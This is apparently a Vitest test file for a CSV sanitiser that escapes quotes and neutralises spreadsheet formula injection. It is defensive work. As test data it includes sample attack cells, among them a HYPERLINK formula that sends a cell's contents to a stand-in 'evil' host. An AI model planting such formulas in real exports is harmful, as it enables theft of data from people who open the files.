import { describe, it, expect } from "vitest";
import { csvSafeCell, csvSafeRow, csvSafeDocument } from "./csv-safe";

describe("csvSafeCell", () => {
  it("wraps plain strings in quotes", () => {
    expect(csvSafeCell("hello")).toBe(`"hello"`);
  });

  it("converts null + undefined to empty quoted cell", () => {
    expect(csvSafeCell(null)).toBe(`""`);
    expect(csvSafeCell(undefined)).toBe(`""`);
  });

  it("converts numbers + booleans via toString", () => {
    expect(csvSafeCell(42)).toBe(`"42"`);
    expect(csvSafeCell(0)).toBe(`"0"`);
    expect(csvSafeCell(true)).toBe(`"true"`);
    expect(csvSafeCell(false)).toBe(`"false"`);
  });

  it("escapes embedded double quotes per RFC 4180", () => {
    expect(csvSafeCell(`Bob "the Builder" Smith`)).toBe(
      `"Bob ""the Builder"" Smith"`
    );
  });

  // Formula injection — the operationally critical class
  it("prefixes leading = with apostrophe", () => {
    expect(csvSafeCell(`=SUM(A1:A10)`)).toBe(`"'=SUM(A1:A10)"`);
  });

  it("prefixes leading + with apostrophe", () => {
    expect(csvSafeCell(`+1234`)).toBe(`"'+1234"`);
  });

  it("prefixes leading - with apostrophe (would be parsed as negative formula)", () => {
    expect(csvSafeCell(`-1234`)).toBe(`"'-1234"`);
  });

  it("prefixes leading @ with apostrophe", () => {
    expect(csvSafeCell(`@SUM`)).toBe(`"'@SUM"`);
  });

  it("prefixes leading tab with apostrophe", () => {
    expect(csvSafeCell(`\tFoo`)).toBe(`"'\tFoo"`);
  });

  it("prefixes leading CR with apostrophe", () => {
    expect(csvSafeCell(`\rFoo`)).toBe(`"'\rFoo"`);
  });

  it("does NOT prefix when formula trigger is mid-string", () => {
    expect(csvSafeCell(`hello=world`)).toBe(`"hello=world"`);
    expect(csvSafeCell(`hello-world`)).toBe(`"hello-world"`);
  });

  it("real-world attack — HYPERLINK exfil", () => {
    const malicious = `=HYPERLINK("http://evil/?x="&A1,"click")`;
    const cell = csvSafeCell(malicious);
    expect(cell.startsWith(`"'=`)).toBe(true);
    // Inner quotes still escaped.
    expect(cell).toContain(`""http://evil/?x=""`);
  });
});

describe("csvSafeRow", () => {
  it("joins cells with comma after sanitizing each", () => {
    expect(csvSafeRow(["a", "b", "c"])).toBe(`"a","b","c"`);
  });

  it("handles mixed types + nulls", () => {
    expect(csvSafeRow(["name", 42, null, true])).toBe(`"name","42","","true"`);
  });

  it("each cell is independently formula-checked", () => {
    expect(csvSafeRow(["safe", "=evil()"])).toBe(`"safe","'=evil()"`);
  });
});

describe("csvSafeDocument", () => {
  it("joins rows with newline", () => {
    const doc = csvSafeDocument([
      ["Header1", "Header2"],
      ["row1col1", "row1col2"],
    ]);
    expect(doc).toBe(`"Header1","Header2"\n"row1col1","row1col2"`);
  });

  it("real-world events export with attacker-planted name", () => {
    const doc = csvSafeDocument([
      ["Event Name", "Net Sales"],
      [`=HYPERLINK("evil","x")`, 850],
      ["Music Park", 2836],
    ]);
    // Attacker row gets neutralized.
    expect(doc).toContain(`"'=HYPERLINK(""evil"",""x"")"`);
    expect(doc).toContain(`"Music Park","2836"`);
  });
});
